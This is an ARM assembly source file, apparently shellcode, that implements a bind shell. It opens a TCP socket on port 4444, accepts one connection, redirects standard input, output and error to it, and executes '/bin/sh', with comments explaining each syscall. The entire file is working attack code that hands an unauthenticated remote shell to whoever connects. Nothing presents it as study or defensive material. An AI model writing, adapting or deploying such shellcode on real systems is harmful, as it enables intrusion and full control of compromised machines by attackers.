
@.syntax unified
.global _start
_start:
 
  @ sockfd = socket(int socket_family, int socket_type, int protocol);
  mov r0, #2    @ PF_INET = 2
  mov r1, #1    @ SOCK_STREAM = 1
  mov r2, #0    @ IPPROTO_IP = 0
  ldr r7, =#281 @ socketcall
  swi 0
 
  @ r0 contains the fd returned by the syscall
  mov r6, r0 @ file descriptor
 
  @ bind the file descriptor to an address/port
  @ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 
  @struct sockaddr_in {
    @ __kernel_sa_family_t sin_family; /* Address family */
    @ __be16 sin_port; /* Port number */
    @ struct in_addr sin_addr; /* Internet address */
  @};
 
  @sin_addr=0
  @sin_port=4444
  @sin_family=AF_INET
 
  mov r1, #0x5C           @ r1=0x5c
  mov r5, #0x11           @ r5=0x11
  mov r1, r1, lsl #24     @ r1=0x5c000000
  add r1, r1, r5, lsl #16 @ r1=0x5c110000 - port number=4444(0x115C)
  add r1, #2              @ r1=0x5c110002 - sin_family+sin_port
  sub r2, r2, r2          @ sin_addr
  push {r1, r2}           @ push into the stack r1 and r2
  mov r1, sp              @ save pointer to sockaddr_in struct
  mov r2, #0x10           @ addrlen
  mov r0, r6              @ mov sockfd into r0
  ldr r7, =#282           @ bind syscall 
  swi 0
 
  @ listen for incoming connections via SYS_LISTEN
  @ int listen(int sockfd, int backlog);
 
  mov r0, r6    @ mov sockfd into r0
  mov r1, #1    @ backlog=1
  ldr r7, =#284 @ listen syscall
  swi 0
 
  @ Accept connections
  @ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 
  mov r0, r6     @ mov sockfd into r0
  sub r1, r1, r1 @ addr=0
  sub r2, r2, r2 @ addrlen=0
  ldr r7, =#285  @ accept syscall
  swi 0
 
  @ Redirect stdin, stdout and stderr via dup2
 
  mov r1, #2       @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r7, #63    @ dup2 syscall
    swi 0
    sub r1, r1, #1 @ decrement counter
    cmp r1, #-1    @ compare r1 with -1
    bne loop       @ if the result is not equal jmp to loop
 
  @ int execve(const char *filename, char *const argv[],char *const envp[]);
  mov r0, pc
  add r0, #32
  sub r2, r2, r2
  push {r0, r2}
  mov r1, sp
  mov r7, #11
  swi 0
 
_exit:
  mov r0, #0
  mov r7, #1
  swi 0  @ exit(0)
 
.asciz "/bin/sh"
